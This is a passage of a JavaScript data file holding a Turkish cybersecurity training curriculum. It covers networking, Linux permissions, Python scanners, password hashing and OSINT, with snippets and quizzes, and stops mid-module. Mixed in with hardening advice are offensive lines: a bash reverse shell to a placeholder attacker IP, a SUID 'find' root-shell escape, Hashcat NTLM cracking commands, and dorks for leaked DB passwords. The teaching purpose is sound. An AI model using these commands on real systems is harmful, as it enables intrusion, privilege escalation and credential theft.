/**
 * BZT Cyber Security - Kapsamli Hacker Egitim Mufredati & Bilgi Deposu (v4.0 ENTERPRISE)
 * Sifirdan En Ileri Seviyeye (Zero-to-Hero) Eksiksiz Siber Guvenlik Modulleri
 * 16 Modul, 64 Kapsamli Egitim Bolumu, Gercekci Senaryo Quizleri ve Terminal Entegrasyonu
 */

const CURRICULUM_DATA = [
  {
    "id": "net-foundations",
    "phase": 1,
    "phaseTitle": "Faz 1: Altyapı & Temeller",
    "title": "Ağ Mimarisi, TCP/IP, OSI ve Paket Anatomisi",
    "icon": "network",
    "difficulty": "Başlangıç",
    "duration": "50 dk",
    "xp": 100,
    "summary": "Ağ mimarisini bilmeyen bir hacker kördür. TCP 3-Way Handshake, OSI 7 Katmanı, DNS hiyerarşisi, ARP zehirlemesi ve paket başlıklarını derinlemesine kavrayın.",
    "tags": [
      "TCP/IP",
      "OSI",
      "Wireshark",
      "DNS",
      "ARP",
      "Handshake"
    ],
    "sections": [
      {
        "heading": "1. OSI Modeli ve Katman Bazlı Saldırı Yüzeyleri",
        "content": "Siber güvenlikte her saldırı vektörü OSI modelinin belirli bir katmanındaki zafiyetleri istismar eder:\n- Katman 2 (Data Link): MAC Adresleri ve ARP protokolü. Saldırılar: ARP Spoofing/Poisoning, MAC Flooding, CAM Table Overflow, VLAN Hopping.\n- Katman 3 (Network): IP Adresleme, Yönlendirme (Routing) ve ICMP. Saldırılar: IP Spoofing, Smurf Attack, Ping of Death, BGP Hijacking.\n- Katman 4 (Transport): TCP & UDP protokolleri, port yönetimi. Saldırılar: SYN Flood DoS, Port Taramaları (SYN Scan, FIN Scan), RST Injection.\n- Katman 7 (Application): HTTP/HTTPS, DNS, SSH, FTP, SMTP. Saldırılar: Web Enjeksiyonları (SQLi, XSS), DNS Cache Poisoning, Man-in-the-Middle (MitM).",
        "codeSnippet": "# Tshark ile ağ arabirimindeki ham TCP paket başlıklarını filtreleme\nsudo tshark -i eth0 -f \"tcp port 80 or tcp port 443\" -T fields -e ip.src -e ip.dst -e tcp.flags -e frame.len",
        "tip": "Nmap varsayılan olarak root yetkisiyle calistiginda SYN Scan (-sS) kullanir. SYN Scan, 3-Way Handshake'i bilerek tamamlamayarak hedef sunucuda soket acilis logu olusmasini engeller.",
        "terminalCommand": "nmap -sS -p 80,443,8080 192.168.1.1"
      },
      {
        "heading": "2. TCP 3-Way Handshake ve Bayrak (Flag) Anatomisi",
        "content": "Guvenilir TCP iletisimi 3 asamali el sikisma ile baslar:\n1. SYN (Synchronize): Istemci rastgele bir Sequence Number (ISN) belirleyerek hedefe SYN bayrakli paket yollar.\n2. SYN-ACK (Synchronize-Acknowledge): Sunucu baglanti istegini kabul eder, kendi ISN degerini ve istemcinin ISN+1 degerini dondurur.\n3. ACK (Acknowledge): Istemci sunucunun dizin numarasini onaylar ve soket ESTABLISHED durumuna gecer.\n\nKritik TCP Bayraklari:\n- SYN: Baglanti baslatma istegi\n- ACK: Alinan veriyi onaylama\n- FIN: Baglantiyi dostane kapatma\n- RST: Hatali veya reddedilen iletisimi zorla sonlandirma\n- PSH: Veriyi bekletmeden uygulama katmanina aktarma\n- URG: Oncelikli acil veri gostergesi",
        "codeSnippet": "# Python Scapy ile ozel bayraklara sahip ham TCP SYN paketi uretimi\nfrom scapy.all import IP, TCP, send\npacket = IP(dst=\"192.168.1.50\")/TCP(dport=445, flags=\"S\", seq=1337)\nsend(packet, verbose=0)",
        "tip": "RST Injection saldirilarinda saldirgan, istemci ile sunucu arasindaki ISN numarasini tahmin ederek sahte bir RST paketi gonderir ve aktif oturumu zorla sonlandirir.",
        "terminalCommand": "netstat -nat"
      },
      {
        "heading": "3. Uygulamali Paket Analizi & Scapy ile Ham Soketler",
        "content": "Paket seviyesinde guvenlik analizi yapmak icin ag kartinin Dinleme (Promiscuous) moduna alinmasi ve ham soketlerin incelenmesi gerekir:\n- Wireshark Display Filter ornekleri:\n  * tcp.flags.syn == 1 and tcp.flags.ack == 0 (Yalnizca ilk SYN istekleri)\n  * http.request.method == \"POST\" (Web formlarina gonderilen veriler)\n  * dns.flags.response == 0 (Yapilan DNS sorgulari)\n- Scapy kutuphanesi ile ag kartina dogrudan bit seviyesinde erisilerek IDS/IPS tespitlerini test edecek ozel paketler uretilebilir.",
        "codeSnippet": "# Scapy ile ICMP Ping ve ARP Taramasi\nfrom scapy.all import ARP, Ether, srp\nans, unans = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=\"192.168.1.0/24\"), timeout=2, verbose=0)\nfor snd, rcv in ans:\n    print(f\"[+] Canli Cihaz: {rcv.psrc} - MAC: {rcv.hwsrc}\")",
        "tip": "ARP protokolu kimlik dogrulama icermez. Agdaki herhangi bir cihaz, ag gecidi (gateway) oldugunu iddia eden sahte ARP yanitlari yayinlayarak trafigi uzerine cekebilir (ARP Cache Poisoning).",
        "terminalCommand": "arp -a"
      },
      {
        "heading": "4. Ag Savunmasi: Dynamic ARP Inspection, SYN Cookies & Hardening",
        "content": "Ag seviyesinde saglam bir savunma mimarisi kurmak icin su bilesenler sarttir:\n- Dynamic ARP Inspection (DAI): Anahtar (Switch) seviyesinde DHCP Snooping tablosunu dogrulayarak sahte ARP paketlerini fiziksel portta dusurur.\n- SYN Cookies: SYN Flood saldirilarinda sunucu bellek tablosunu (backlog queue) tuketmemek icin baglanti durumunu istemciye dondurulen Sequence Number icine kriptografik olarak gomerek korur.\n- Stateful Paket Filtreleme: Yalnizca onceden baslatilmis (ESTABLISHED, RELATED) oturumlara ait paketlerin iceri girmesine izin verir.",
        "codeSnippet": "# Linux cekirdeginde SYN Flood korumasini (SYN Cookies) aktiflestirme\nsudo sysctl -w net.ipv4.tcp_syncookies=1\nsudo sysctl -w net.ipv4.tcp_max_syn_backlog=2048\nsudo sysctl -p",
        "tip": "Kurumsal aglarda Port Security aktiflestirilerek her fiziksel switch portuna tek bir MAC adresi atanmali, yabanci cihaz takildiginda port otomatik kapatilmalidir (err-disable).",
        "terminalCommand": "iptables -L -n -v"
      }
    ],
    "quiz": {
      "question": "Nmap'in varsayilan SYN Stealth Scan (-sS) taramasinda, hedef port aciksa hedef sunucudan donen bayrak kombinasyonu nedir?",
      "options": [
        "SYN / ACK",
        "RST / ACK",
        "FIN / PSH",
        "Yalnizca ACK"
      ],
      "correct": 0,
      "explanation": "Acik bir port SYN paketine 'SYN/ACK' ile yanit verir. Nmap bunu algiladigi anda hemen bir RST paketi gondererek 3-way handshake'i tamamlamaz ve log kaydini minimize eder."
    }
  },
  {
    "id": "linux-bash-mastery",
    "phase": 1,
    "phaseTitle": "Faz 1: Altyapı & Temeller",
    "title": "Linux Çekirdeği, Özel İzinler (SUID/SGID) ve Bash Savaş Sanatı",
    "icon": "terminal",
    "difficulty": "Başlangıç",
    "duration": "60 dk",
    "xp": 120,
    "summary": "Hacker dunyasinin ana dili Linux'tur. Dosya izinleri (rwx, SUID, SGID), boru hatlari (pipes), grep/awk filtreleri, tek satirlik pentest scriptleri ve sistem sertlestirme.",
    "tags": [
      "Linux",
      "Bash",
      "SUID",
      "Chmod",
      "Grep",
      "Permissions"
    ],
    "sections": [
      {
        "heading": "1. Linux Dosya Sistemi Hiyerarşisi ve Yetki Modeli",
        "content": "Linux'ta her sey bir dosyadir. Standart izin modeli 3 aktor ve 3 temel izin uzerine kuruludur:\n- Aktorler: Kullanici (User - u), Grup (Group - g), Digerleri (Others - o).\n- Temel Izinler: Okuma (Read - r = 4), Yazma (Write - w = 2), Calistirma (Execute - x = 1).\n- Kritik Sistem Dosyalari:\n  * /etc/passwd: Tum kullanici hesaplarinin UID/GID ve kabuk bilgilerini tutar (Herkes okuyabilir).\n  * /etc/shadow: Kullanici parolalarinin tuzlanmis (salted) hash'lerini tutar (Yalnizca root okuyabilir).\n  * /etc/sudoers: Hangi kullanicilarin hangi komutlari root yetkisiyle calistirabilecegini tanimlar.",
        "codeSnippet": "# Linux izinlerini octal (sayisal) ve sembolik olarak ayarlama\nchmod 750 /var/www/private_script.sh   # u=rwx, g=rx, o=hicbiri\nchown root:securitygroup /opt/audit.py  # Dosya sahibini ve grubunu degistir",
        "tip": "/etc/passwd dosyasina eger yazma (w) izni verilmisse, saldirgan bu dosyaya UID 0 (root) olan yeni bir kullanici ekleyerek aninda tam sistem kontrolu saglayabilir.",
        "terminalCommand": "ls -la /etc/passwd /etc/shadow"
      },
      {
        "heading": "2. Özel İzinler: SUID, SGID ve Sticky Bit İstismarı",
        "content": "Standart izinlerin otesinde Linux'ta yetki yukseltmede en kritik rol oynayan ozel izinler vardir:\n- SUID (Set User ID - 4000): Bir ikili (binary) calistirildiginda, o anki kullanicinin degil DOSYA SAHIBININ (genellikle root) haklariyla calisir (-rwsr-xr-x).\n- SGID (Set Group ID - 2000): Dosya calistirildiginda dosya grubunun haklariyla calisir (-rwxr-sr-x).\n- Sticky Bit (1000): Dizin icindeki dosyalari yalnizca dosya sahibi ve root silebilir (/tmp dizini ornegi: drwxrwxrwt).\n\nEger /bin/bash, /usr/bin/find, /usr/bin/vim gibi programlara SUID biti atanmissa, GTFOBins yontemleriyle saniyeler icinde root olunabilir!",
        "codeSnippet": "# Sistemdeki tum SUID bitine sahip dosyalari tespit etme\nfind / -perm -4000 -type f -exec ls -la {} + 2>/dev/null\n\n# find ikilisi uzerinden SUID istismari ile root shell acma\nfind . -exec /bin/sh -p \\; -quit",
        "tip": "GTFOBins web sitesi, yerlesik Linux ikililerinin SUID, Sudo veya Capabilities ile nasil guvenlik kisitlamalarini astigini listeleyen temel referans kaynagidir.",
        "terminalCommand": "find / -perm -u=s -type f 2>/dev/null"
      },
      {
        "heading": "3. Pentester İçin Bash One-Liner'ları ve Otomasyon",
        "content": "Sizma testlerinde hiz ve otomasyon her seydir. Linux boru hatlari (pipes |) ile guclu tek satirlik komutlar uretilebilir:\n- Port Taramasi (Nmap olmadan saf Bash ile):\n  /dev/tcp sanal dosya sistemi kullanilarak hedef agdaki acik portlar saniyeler icinde bulunabilir.\n- Web Dizini Fuzzing:\n  curl ve xargs ile kelime listesi uzerinden HTTP 200 donduren gizli dizinler taranabilir.\n- Log Analizi:\n  Grep, awk, sort ve uniq ile Apache veya Nginx erisim loglarindan en cok istek yapan supheli IP'ler filtrelenir.",
        "codeSnippet": "# Saf Bash ile tek satirda 20-100 arasi portlari tarama\nfor p in {20..100}; do (echo >/dev/tcp/127.0.0.1/$p) >/dev/null 2>&1 && echo \"[+] Port $p ACIK\"; done\n\n# Web erisim logundan en cok istek atan ilk 5 IP adresini listeleme\nawk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head -5",
        "tip": "Reverse Shell alirken bash -i >& /dev/tcp/SALDIRGAN_IP/PORT 0>&1 komutu, hedef sistemdeki interaktif kabugu saldirganin netcat dinleyicisine yonlendirir.",
        "terminalCommand": "ps aux | grep root"
      },
      {
        "heading": "4. Linux Sistem Sertleştirme (Hardening) ve Auditd",
        "content": "Sistemi saldirilara karsi celik zirhla kaplamak icin Blue Team tarafinda su adimlar uygulanir:\n- /etc/sudoers Guvenligi: Asla 'NOPASSWD: ALL' kuralini genis kullanici gruplarina tanimlamayin. Komutlari tam mutlak yol ile (orn: /bin/systemctl) kisitlayin.\n- SSH Sertlestirme (/etc/ssh/sshd_config):\n  * PermitRootLogin no (Root dogrudan giris yapamasin)\n  * PasswordAuthentication no (Yalnizca SSH Anahtar cifti ile girise izin verilsin)\n  * MaxAuthTries 3 (Brute-force saldirilarina karsi sinirlama)\n- Linux Audit Subsystem (Auditd): Kritik ikililerin ve /etc dizininin dosya erisimlerini anlik olarak denetleyin.",
        "codeSnippet": "# Kritik sistem dosyalarini degisikliklere karsi izleyen Auditd kurali ekleme\nsudo auditctl -w /etc/passwd -p wa -k passwd_degisiklik\nsudo auditctl -w /etc/sudoers -p wa -k sudoers_degisiklik\nsudo ausearch -k passwd_degisiklik --format text",
        "tip": "Lynis gibi acik kaynakli guvenlik denetim araclari tek bir komutla yuzlerce guvenlik acigini ve yapilandirma hatasini tarayip puanlar.",
        "terminalCommand": "sudo -l"
      }
    ],
    "quiz": {
      "question": "Bir Linux ikilisinde SUID (4000) biti aktif oldugunda, bu ikili calistirildiginda hangi kullanicinin yetkileriyle yurutulur?",
      "options": [
        "Dosya sahibinin (Owner - genelde root)",
        "Komutu calistiran kullanicinin",
        "Her zaman 'nobody' kullanicisinin",
        "En dusuk yetkili konuk hesabin"
      ],
      "correct": 0,
      "explanation": "SUID biti atanmis bir dosya, onu calistiran kim olursa olsun dosya sahibinin (Owner) yetkileriyle yurutulur. Eger dosya sahibi root ise komut root haklariyla calisir."
    }
  },
  {
    "id": "python-for-hackers",
    "phase": 1,
    "phaseTitle": "Faz 1: Altyapı & Temeller",
    "title": "Hackerlar İçin Python & Exploit Geliştirme Temelleri",
    "icon": "code",
    "difficulty": "Orta",
    "duration": "60 dk",
    "xp": 130,
    "summary": "Hazir araclar bittiginde gercek hacker kendi silahini yazar. Python ile soket programlama, cok kanalli port tarayicilar, banner grabbing ve exploit gelistirme.",
    "tags": [
      "Python",
      "Sockets",
      "ExploitDev",
      "Threading",
      "PortScanner",
      "Scapy"
    ],
    "sections": [
      {
        "heading": "1. Python ile Soket Programlama & Ağ İletişimi",
        "content": "Siber guvenlikte Python'in en buyuk avantaji, yerlesik 'socket' modulu sayesinde ek kutuphaneye ihtiyac duymadan dogrudan ag katmaninda konusabilmesidir:\n- AF_INET: IPv4 adresleme ailesini belirtir.\n- SOCK_STREAM: Guvenilir, baglanti odakli TCP soketi acar.\n- SOCK_DGRAM: Baglantisiz hizli UDP soketi acar.\n- connect_ex(): connect() fonksiyonunun aksine hata firlatmaz; baglanti basariliysa 0, basarisizsa hata kodu (orn: 111 Connection Refused) dondurur.",
        "codeSnippet": "import socket\n\n# Basit bir TCP Port Kontrol Fonksiyonu\ndef check_port(host, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(1.0)\n    result = s.connect_ex((host, port))\n    s.close()\n    return result == 0  # 0 donerse port aciktir\n\nif check_port(\"127.0.0.1\", 80):\n    print(\"[+] 80 Nolu Port Acik!\")",
        "tip": "connect_ex fonksiyonunun zaman asimi (timeout) suresini dogru ayarlamak kritik onem tasir. Cok kisa sureler acik portlarin gozden kacmasina, cok uzun sureler taramanin saatler surmesine neden olur.",
        "terminalCommand": "python3 -c 'import socket; print(socket.__file__)'"
      },
      {
        "heading": "2. Çok Kanallı (Multithreading) Port Tarayıcı Mimarisi",
        "content": "Tekil dongu ile 65.535 portu sirayla taramak dakikalar hatta saatler surer. Cok kanalli programlama ile is parcalari paralel olarak yurutulur:\n- threading.Thread: Her bir port kontrolunu bagimsiz bir thread olarak baslatir.\n- queue.Queue: Is parcalarinin (port numaralari) thread'ler arasinda cakismadan, thread-safe sekilde paylastirilmasini saglar.\n- Worker Mantigi: Belirlenen sayida (orn: 50 veya 100) thread ayni anda kuyruktan port cekerek taramayi saniyeler icinde tamamlar.",
        "codeSnippet": "import socket, threading\nfrom queue import Queue\n\ntarget = \"127.0.0.1\"\nq = Queue()\n\ndef worker():\n    while not q.empty():\n        port = q.get()\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(0.5)\n        if s.connect_ex((target, port)) == 0:\n            print(f\"[+] Acik Port: {port}\")\n        s.close()\n        q.task_done()\n\n# Kuyruga 1-1024 arasi portlari doldur\nfor p in range(1, 1025): q.put(p)\n\n# 30 adet thread baslat\nfor _ in range(30):\n    t = threading.Thread(target=worker, daemon=True)\n    t.start()\nq.join()",
        "tip": "Python'daki GIL (Global Interpreter Lock), CPU yogun islemlerde thread'leri sinirlasa da ag ve I/O yogun islemlerde (soket beklemesi gibi) multithreading muazzam bir hiz artisi saglar.",
        "terminalCommand": "python3 --version"
      },
      {
        "heading": "3. Banner Grabbing ve HTTP İstek Otomasyonu",
        "content": "Bir portun acik oldugunu bilmek yetmez; o portta calisan servisin surumunu ve banner bilgisini yakalamak gerekir:\n- Banner Grabbing: Servise baglandiktan hemen sonra gonderilen 'HEAD / HTTP/1.1' veya soket okuma ile donen surum metni (orn: Apache 2.4.49, OpenSSH 8.2p1).\n- Requests Kutuphanesi: Modern web exploitlerinde header manipülasyonu, cookie takibi ve otomatik form gonderme islemlerini yonetir.",
        "codeSnippet": "import socket\n\n# Hedef servisin surum banner'ini yakalama\ndef grab_banner(ip, port):\n    try:\n        s = socket.socket()\n        s.settimeout(2.0)\n        s.connect((ip, port))\n        s.send(b\"HEAD / HTTP/1.0\\r\\n\\r\\n\")\n        banner = s.recv(1024).decode(errors=\"ignore\")\n        s.close()\n        return banner\n    except Exception as e:\n        return str(e)\n\nprint(grab_banner(\"127.0.0.1\", 80))",
        "tip": "Banner bilgilerinde donen surum numaralari, Exploit-DB veya NIST NVD veritabanlarinda aratilarak hedefteki 1-Day zafiyetler dogrudan tespit edilebilir.",
        "terminalCommand": "python3 -c 'import requests; print(\"[+] Requests kutuphanesi hazir\")'"
      },
      {
        "heading": "4. Güvenli Python Geliştirme ve Statik Kod Analizi",
        "content": "Python ile guvenli kod yazarken ve saldirganlarin yazdigi kodlari analiz ederken dikkat edilmesi gereken kritik tuzaklar:\n- eval() ve exec() Tehlikesi: Kullanici girdisini dinamik kod olarak calistirmak dogrudan Remote Code Execution (RCE) zafiyeti olusturur.\n- pickle.loads() Zafiyeti: Guvenilmeyen kaynaktan gelen serilestirilmis veriyi acmak __reduce__ metodu uzerinden aninda sistem komutu calistirir.\n- os.system() yerine subprocess.run(..., shell=False): Komut enjeksiyonlarini onlemek icin komut argumanlari dizi seklinde verilmelidir.",
        "codeSnippet": "# Bandit araci ile Python kodlarindaki guvenlik aciklarini statik olarak tarama\n# Kurulum: pip install bandit\n# Calistirma: bandit -r /proje_dizini/ -ll -v",
        "tip": "Python'da guvenli serilestirme icin asla 'pickle' kullanmayin; daima 'json' veya semasi tanimlanmis 'Protocol Buffers' kullanin.",
        "terminalCommand": "python3 -c 'import sys; print(f\"Python Surumu: {sys.version}\")'"
      }
    ],
    "quiz": {
      "question": "Python socket kutuphanesinde 'socket.connect_ex((ip, port))' fonksiyonu basarili bir TCP el sikismasi gerceklestiginde hangi degeri dondurur?",
      "options": [
        "0 (Sifir)",
        "1 (Bir)",
        "True (Boolean)",
        "-1 (Eksi Bir)"
      ],
      "correct": 0,
      "explanation": "connect_ex() basarili baglantida C soket standardi geregi 0 (sifir) dondurur. Herhangi bir hata durumunda (port kapali, filtreli, zaman asimi) ilgili errno kodunu dondurur."
    }
  },
  {
    "id": "cryptography-hashing",
    "phase": 1,
    "phaseTitle": "Faz 1: Altyapı & Temeller",
    "title": "Kriptografi, Hash Kırma & Parola Güvenliği",
    "icon": "key",
    "difficulty": "Orta",
    "duration": "55 dk",
    "xp": 125,
    "summary": "Veriyi sifrelemek ile ozetlemek arasindaki farki kavrayin. Simetrik/Asimetrik sifreleme, Hashcat ile GPU tabanli parola kirma, Rainbow Tables ve modern tuzlama (salting).",
    "tags": [
      "Crypto",
      "Hashcat",
      "MD5",
      "SHA256",
      "Salting",
      "RainbowTables"
    ],
    "sections": [
      {
        "heading": "1. Şifreleme (Encryption) vs Kriptografik Özetleme (Hashing)",
        "content": "Siber guvenlikte en cok karistirilan iki temel kavram:\n- Sifreleme (Encryption - Cift Yonlu): Veriyi bir anahtar (key) kullanarak anlamsiz sifreli metne (ciphertext) donusturur. Dogru anahtara sahip olan kisi veriyi tekrar orjinal haline getirebilir (Decryption).\n  * Simetrik: Ayni anahtar hem sifreler hem cozer (AES-256, ChaCha20). Cok hizlidir.\n  * Asimetrik: Biri acik (Public Key), digeri gizli (Private Key) olan anahtar cifti kullanir (RSA, ECC).\n- Ozetleme (Hashing - Tek Yonlu): Herhangi bir boyuttaki veriyi sabit uzunlukta matematiksel bir parmak izine donusturur. Geri dondurulemez (MD5, SHA-256, SHA-3).",
        "codeSnippet": "# Linux terminalinde SHA-256 ve MD5 ozetleri uretme\necho -n \"GizliParola123!\" | sha256sum\necho -n \"GizliParola123!\" | md5sum",
        "tip": "Kriptografik hash fonksiyonlarinda 'Cig Etkisi' (Avalanche Effect) vardir: Girdideki tek bir karakter degistiginde bile ozet metnin en az yuzde 50'si tamamen degisir.",
        "terminalCommand": "openssl dgst -sha256 /etc/issue"
      },
      {
        "heading": "2. Parola Hash'leri, Gökkuşağı Tabloları (Rainbow Tables) ve Tuzlama",
        "content": "Tuzsuz (Unsalted) parola hash'leri saldirganlar icin kolay hedeftir:\n- Rainbow Tables: Milyonlarca olasi parolanin onceden hesaplanmis hash degerlerini tutan devasa arama tablolaridir. Saldirgan tuzsuz bir MD5/NTLM hash'i saniyeler icinde cozebilir.\n- Tuzlama (Salting): Her kullanicinin parolasi hash'lenmeden once basina veya sonuna rastgele benzersiz bir dize (salt) eklenir:\n  Hash = SHA256(Parola + Benzersiz_Rastgele_Tuz)\n  Bu yontem, onceden hazirlanmis tum gokkusagi tablolarini tamamen gecersiz kilar.",
        "codeSnippet": "# Python ile guvenli tuzlanmis parola hash'i olusturma (bcrypt)\nimport bcrypt\npassword = b\"BZT_Guvenli_Parola!2026\"\nsalt = bcrypt.gensalt(rounds=12)\nhashed = bcrypt.hashpw(password, salt)\nprint(f\"[+] Guvenli Hash: {hashed.decode()}\")",
        "tip": "MD5 ve SHA-1 algoritmalarinda carpisma (Collision - iki farkli girdinin ayni hash'i vermesi) pratik olarak kanitlanmistir. Parola saklama icin daima Argon2id veya Bcrypt tercih edilmelidir.",
        "terminalCommand": "cat /etc/login.defs | grep ENCRYPT_METHOD"
      },
      {
        "heading": "3. Hashcat ile GPU Tabanlı Parola Kırma Sanatı",
        "content": "Hashcat, dunyanin en hizli ve en gelismis parola kirma aracidir. Ekran kartlarinin (GPU) binlerce cekirdegi uzerinde paralel hesaplama yapar:\n- Saldiri Modlari (-a):\n  * -a 0: Duz Sozluk Saldirisi (Dictionary Attack - rockyou.txt)\n  * -a 3: Kaba Kuvvet / Maske Saldirisi (Brute-force / Mask)\n  * -a 1: Kombinasyon Saldirisi (Iki kelime listesini birlestirme)\n- Populer Hash Turleri (-m):\n  * -m 0: MD5\n  * -m 1000: NTLM (Windows Parolalari)\n  * -m 1800: SHA-512 crypt (Linux /etc/shadow)\n  * -m 22000: WPA-PBKDF2-PMKID (WiFi Handshake)",
        "codeSnippet": "# NTLM hash'ini RockYou kelime listesi ile kirmak\nhashcat -m 1000 -a 0 target_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# 8 karakterli ve son iki hanesi sayi olan maske saldirisi (?l: kucuk harf, ?d: rakam)\nhashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?d?d",
        "tip": "Hashcat kural tabanli saldirilarda (-r rules/best64.rule) sozlukteki kelimelerin sonuna '123', '!', yil ekleme ve buyuk-kucuk harf degistirme gibi varyasyonlari otomatik dener.",
        "terminalCommand": "hashcat --help | head -20"
      },
      {
        "heading": "4. Modern Parola Güvenliği: Argon2, PBKDF2 ve MFA/FIDO2",
        "content": "Sistemlerin gelecekteki saldirilara karsi korunmasi icin modern kriptografik standartlar:\n- Key Stretching (Anahtar Genisletme): Parolayi yuz binlerce kez iterasyondan gecirerek CPU ve GPU maliyetini bilerek yuksek tutma (PBKDF2, Scrypt).\n- Argon2id: Parola Hash'leme Yarismasi (PHC) birincisi olan, hem bellek (RAM) hem zaman maliyeti yuksek en guclu modern standart.\n- Parolasiz Kimlik Dogrulama (FIDO2 / WebAuthn): Kullanici parolalarini tamamen ortadan kaldirarak asimetrik kriptografi ile calisan donanim guvenlik anahtarlari (YubiKey).",
        "codeSnippet": "# Python ile Argon2id kullanarak parola hashleme\nfrom argon2 import PasswordHasher\nph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=4)\nhashed = ph.hash(\"CokGizliSifre2026!\")\nprint(f\"[+] Argon2id Hash: {hashed}\")",
        "tip": "Iki Adimli Dogrulama (MFA) SMS yerine daima TOTP (Google Authenticator) veya FIDO2 donanim anahtarlari ile yapilmalidir. SMS, SIM Swapping saldirilarina karsi savunmasizdir.",
        "terminalCommand": "openssl version"
      }
    ],
    "quiz": {
      "question": "Parola hash'leme surecinde her kullaniciya ozel benzersiz rastgele bir veri eklenerek Gokkusagi Tablosu (Rainbow Table) saldirilarini imkansiz kilan mekanizmaya ne ad verilir?",
      "options": [
        "Tuzlama (Salting)",
        "Sifreleme (Encryption)",
        "Bicimlendirme (Formatting)",
        "Sikistirma (Compression)"
      ],
      "correct": 0,
      "explanation": "Tuzlama (Salting), parolanin onune veya arkasina benzersiz rastgele bir dize ekleyerek ayni parolaya sahip iki kullanicinin hash'lerinin tamamen farkli olmasini saglar ve hazir arama tablolarini bozar."
    }
  },
  {
    "id": "osint-recon-deep",
    "phase": 2,
    "phaseTitle": "Faz 2: Keşif & OSINT",
    "title": "Pasif Keşif, OSINT & Açık Kaynak İstihbaratı",
    "icon": "search",
    "difficulty": "Başlangıç",
    "duration": "45 dk",
    "xp": 110,
    "summary": "Hedefe tek bir paket gondermeden sirket sirlarini, acik portlari, calisan e-postalarini ve sunucu altyapisini ortaya cikarin. Google Dorking, Shodan, crt.sh ve Whois.",
    "tags": [
      "OSINT",
      "GoogleDorking",
      "Shodan",
      "crt.sh",
      "Recon",
      "Whois"
    ],
    "sections": [
      {
        "heading": "1. Pasif Keşif Metodolojisi & Dijital Ayak İzi",
        "content": "Sizma testlerinin ve siber saldirilarin yuzde 80'i kesif asamasinda basariya ulasir:\n- Pasif Kesif: Hedef sunucuya dogrudan hicbir paket gonderilmez. Tum bilgiler ucuncu parti kaynaklardan (arama motorlari, SSL kayitlari, internet tarayicilari) toplanir. Hedefin guvenlik loglarinda sifir iz kalir.\n- Aktif Kesif: Hedef porta veya IP'ye dogrudan temas edilir (Nmap taramasi, web dizin fuzzing). IDS/WAF loglarinda hemen tespit edilir.\n- Temel Hedefler: Sirket alan adlari (domain), alt alan adlari (subdomain), calisan e-posta formatlari, IP bloklari (ASN) ve acikta kalmis gizli dosyalar.",
        "codeSnippet": "# Whois ve DNS sorgusu ile hedef IP blogunu ve kayitli ASN bilgisini bulma\nwhois targetdomain.com | grep -E \"Registrar|Name Server|Admin Email\"\ndig ANY targetdomain.com +nocmd +noall +answer",
        "tip": "Netcraft ve SecurityTrails gibi servisler, bir web sitesinin gecmiste kullandigi gercek sunucu IP'lerini gostererek Cloudflare gibi CDN/WAF korumalarini bypass etmeyi saglar.",
        "terminalCommand": "whois google.com | head -15"
      },
      {
        "heading": "2. İleri Düzey Google Dorking & Hassas Veri Avı",
        "content": "Arama motoru robotlari internetteki neredeyse her dizini indeksler. Ozel arama operatorleri (Google Dorks) ile gizli veriler ortaya cikar:\n- site: Sadece belirtilen domain icinde arama yapar (site:hedef.com).\n- filetype: Belirli dosya uzantilarini filtreler (filetype:env, filetype:sql, filetype:pdf).\n- inurl: URL icerisinde gecen kelimeleri arar (inurl:admin, inurl:phpinfo.php).\n- intitle: Sayfa basligini hedefler (intitle:\"index of\" \"parent directory\").\n- ext:log OR ext:conf: Sunucu yapilandirma ve log dosyalarini yakalar.",
        "codeSnippet": "# Kritik Google Dork kaliplari\nsite:hedef.com ext:env OR ext:yml OR ext:json \"DB_PASSWORD\"\nsite:hedef.com inurl:login intitle:\"admin portal\"\nsite:hedef.com filetype:sql \"INSERT INTO\" \"password\"",
        "tip": "Google Hacking Database (GHDB), Exploit-DB tarafindan guncellenen ve binlerce calisan Google Dork sorgusunu kategorize eden devasa bir kaynaktir.",
        "terminalCommand": "curl -sI https://www.google.com | head -5"
      },
      {
        "heading": "3. DNS İstihbaratı, Subdomain Keşfi & crt.sh",
        "content": "Sirketler ana sitelerini cok iyi korusa da test, staging veya unutulmus alt alan adlari (subdomain) genellikle savunmasizdir:\n- Sertifika Seffafligi (Certificate Transparency - crt.sh): Bir domain icin uretilen her SSL sertifikasi herkese acik CT loglarina yazilir. crt.sh uzerinden hedefin tum alt alan adlari aninda listelenebilir.\n- Subdomain Brute-force: Amass, Sublist3r veya Assetfinder araclari devasa kelime listeleriyle DNS sorgusu atarak gizli hostlari kesfeder.\n- DNS Zone Transfer (AXFR): Yanlis yapilandirilmis bir DNS sunucusu tum alt ag haritasini tek bir sorguyla saldirgana teslim edebilir.",
        "codeSnippet": "# crt.sh uzerinden hedef domaine ait alt alan adlarini tek satirda cekme\ncurl -s \"https://crt.sh/?q=%25.hedef.com&output=json\" | jq -r '.[].name_value' | sort -u\n\n# DNS Zone Transfer zafiyeti testi (AXFR)\ndig axfr @ns1.hedef.com hedef.com",
        "tip": "Subdomain Takeover: Bir alt alan adi artik var olmayan bir bulut hizmetine (GitHub Pages, AWS S3 bucket, Heroku) yonlendirilmisse, saldirgan bu hizmeti kendi adina acarak domaini ele gecirebilir.",
        "terminalCommand": "host -t ns google.com"
      },
      {
        "heading": "4. Dijital Ayak İzi Temizleme, Sızıntı Analizi & OPSEC",
        "content": "Bir hacker veya siber guvenlik uzmani icin Operasyonel Guvenlik (OPSEC) ve sizinti analizi:\n- Breach Veritabanlari: HaveIBeenPwned ve DeHashed platformlari, sirket calisanlarinin gecmis veri sizintilarindaki e-posta ve parola hash'lerini ortaya koyar.\n- Shodan & Censys: Internet baglantili her cihaz ve IP adresinin acik portlarini ve servis afislerini (banner) tarayarak hedef sirketin dis ag haritasini sunar.\n- OPSEC Kurallari: Arastirma yaparken gercek kimlikle baglantili e-postalar, tarayicilar ve sabit IP'ler asla kullanilmamali; sanal izole ortamlar (Sock Puppets) tercih edilmelidir.",
        "codeSnippet": "# Shodan CLI ile hedef organizasyona ait acik servisleri sorgulama\n# shodan search org:\"Hedef Sirket\" --fields ip_str,port,org\nshodan host 8.8.8.8",
